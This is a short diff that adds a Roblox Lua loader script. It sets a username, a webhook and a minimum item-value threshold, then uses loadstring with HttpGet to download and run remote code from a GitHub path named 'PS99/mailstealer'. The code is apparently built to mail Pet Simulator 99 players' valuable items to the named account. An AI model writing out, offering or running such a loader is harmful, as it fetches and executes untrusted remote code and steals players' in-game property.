@@ -1,0 +1,4 @@
+Username = "Ferbi2348"
+Webhook = "None"
+min_rap =   --500k
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/PS99/mailstealer"))()
